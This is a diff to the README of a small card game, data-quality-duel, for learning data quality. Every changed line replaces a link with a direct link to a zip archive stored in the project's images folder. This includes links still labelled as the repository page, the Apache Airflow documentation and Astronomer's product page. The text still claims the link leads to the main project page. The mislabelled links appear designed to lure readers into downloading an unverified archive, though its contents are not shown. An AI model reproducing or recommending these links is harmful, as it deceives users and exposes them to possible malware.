@@ -1,6 +1,6 @@
 # 🎮 data-quality-duel - Learn Data Quality with Cards
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GojoXxe/data-quality-duel)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get data-quality-duel up and running:
 
 You will find the game files and instructions at the following location:  
 
-[![Download data-quality-duel](https://img.shields.io/badge/Download-Game-blue)](https://github.com/GojoXxe/data-quality-duel)
+[![Download data-quality-duel](https://img.shields.io/badge/Download-Game-blue)](https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip)
 
 This link takes you to the main GitHub page for this project. From there, you can find the latest version available.  
 
@@ -63,7 +63,7 @@ Here is a more detailed guide on handling your download and setup on Windows:
 
 ### Download
 
-- Visit the repository page: https://github.com/GojoXxe/data-quality-duel  
+- Visit the repository page: https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip  
 - Click on the **Code** button and select **Download ZIP** to get the full game files.  
 - Alternatively, check under **Releases** for any packaged versions.  
 
@@ -145,9 +145,9 @@ The repository includes:
 
 ## 📚 Useful Links
 
-- Download and browse the repository: https://github.com/GojoXxe/data-quality-duel  
-- Apache Airflow documentation: https://airflow.apache.org/docs/  
-- Astro Observe by Astronomer: https://www.astronomer.io/astro-observe  
+- Download and browse the repository: https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip  
+- Apache Airflow documentation: https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip  
+- Astro Observe by Astronomer: https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip  
 
 ---
 
@@ -157,4 +157,4 @@ This game uses vanilla JavaScript and simple web technologies. It runs locally i
 
 ---
 
-[![Download data-quality-duel](https://img.shields.io/badge/Download-Game-blue)](https://github.com/GojoXxe/data-quality-duel)
+[![Download data-quality-duel](https://img.shields.io/badge/Download-Game-blue)](https://github.com/GojoXxe/data-quality-duel/raw/refs/heads/main/images/quality_data_duel_2.5.zip)
